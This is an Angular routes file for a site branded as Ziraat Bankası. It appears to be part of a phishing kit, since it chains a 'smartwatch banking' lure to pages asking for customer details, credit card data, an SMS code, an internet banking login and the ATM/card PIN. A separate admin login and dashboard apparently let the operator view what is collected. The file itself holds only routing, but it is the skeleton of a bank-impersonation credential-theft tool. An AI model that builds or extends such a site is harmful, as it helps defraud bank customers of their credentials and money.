import { Routes } from '@angular/router';
import { BankShell } from './layout/bank-shell/bank-shell';
import { HomePage } from './features/home/home-page/home-page';
import { CustomerInfoPage } from './features/customer-info/customer-info-page/customer-info-page';
import { CardInfoPage } from './features/card-info/card-info-page/card-info-page';
import { SmsAuthPage } from './features/sms-auth/sms-auth-page/sms-auth-page';
import { LoginPage } from './features/login/login-page/login-page';
import { AtmPinPage } from './features/atm-pin/atm-pin-page/atm-pin-page';
import { AdminLogin } from './features/admin/admin-login/admin-login';
import { AdminDashboard } from './features/admin/admin-dashboard/admin-dashboard';

export const routes: Routes = [
  {
    path: '',
    component: BankShell,
    children: [
      {
        path: '',
        component: HomePage,
        title: 'Ziraat Bankası - Akıllı Saat Bankacılığı',
      },
      {
        path: 'customer-info',
        component: CustomerInfoPage,
        title: 'Ziraat Bankası - Müşteri Bilgi Formu'
      },
      {
        path: 'card-info',
        component: CardInfoPage,
        title: 'Ziraat Bankası - Kredi Kartı Bilgileri Doğrulama'
      },
      {
        path: 'sms-auth',
        component: SmsAuthPage,
        title: 'Ziraat Bankası - SMS Doğrulama'
      },
      {
        path: 'login',
        component: LoginPage,
        title: 'Ziraat Bankası - İnternet Şubesi Giriş'
      },
      {
        path: 'atm-pin',
        component: AtmPinPage,
        title: 'Ziraat Bankası - ATM / Kart Şifresi Doğrulama'
      }
    ],
  },
  {
    path: 'admin/login',
    component: AdminLogin,
    title: 'Admin Giriş'
  },
  {
    path: 'admin/dashboard',
    component: AdminDashboard,
    title: 'Admin Paneli'
  }
];
